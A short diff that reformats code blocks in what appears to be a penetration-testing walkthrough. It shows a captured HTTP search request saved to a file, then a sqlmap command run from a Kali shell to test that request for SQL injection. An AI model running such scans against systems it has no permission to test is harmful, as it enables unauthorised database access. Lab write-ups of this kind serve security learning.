@@ -407,11 +407,13 @@ Content-Length: 11
 Connection: close
 Upgrade-Insecure-Requests: 1
 
-search=help```
+search=help
+```
 
 *Now Right click and click on `copy to file` option.
 
-```root@kali:/SqlMap# sqlmap -r search.req --batch --force-ssl
+```
+root@kali:/SqlMap# sqlmap -r search.req --batch --force-ssl
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.4.3#stable}
